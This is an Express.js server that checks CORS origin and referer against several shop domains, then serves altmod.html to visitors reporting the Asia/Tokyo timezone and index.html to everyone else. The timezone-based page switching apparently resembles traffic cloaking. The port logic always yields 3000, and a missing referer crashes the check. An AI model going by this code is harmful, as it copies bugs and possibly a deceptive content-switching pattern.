const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const PORT = 3000 || process.env.PORT;

// List of allowed frontend origins for CORS
const allowedOrigins = [
  "https://thaibasiljp.com",
  "https://sakiinstant.shop",
  "https://sakiinstant.shop/",
  "http://sakiinstant.shop",
  "http://sakiinstant.shop/",
  "http://thaibasiljp.com",
  "https://theteamania.shop",
  "http://theteamania.shop",
  "https://theteamania.shop/",
  "http://theteamania.shop/",
  "http://127.0.0.1:5501",
  "http://127.0.0.1:5500",
];

// Normalize referer function to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// CORS configuration
const corsOptions = {
  origin: function (origin, callback) {
    console.log(`Origin: ${origin}`); // Log the origin for debugging
    if (allowedOrigins.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

// Apply the CORS middleware
app.use(cors(corsOptions));

// Middleware to parse JSON bodies
app.use(express.json());

// Route to handle the POST request
app.post(
  "/",
  (req, res, next) => {
    const referer = normalizeReferer(req.headers.referer);
    console.log(`Referer: ${referer}`); // Log the referer for debugging

    // Check if the normalized referer exists in the allowedOrigins array
    if (allowedOrigins.some(allowedOrigin => referer.startsWith(allowedOrigin))) {
      next();
    } else {
      res.status(403).send("Access forbidden due to invalid referer.");
    }
  },
  (req, res) => {
    const { timezone } = req.body;
    console.log(`Timezone: ${timezone}`); // Log the timezone for debugging

    if (timezone === "Asia/Tokyo") {
      res.sendFile(path.join(__dirname, "altmod.html"));
    } else {
      res.sendFile(path.join(__dirname, "index.html"));
    }
  }
);

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
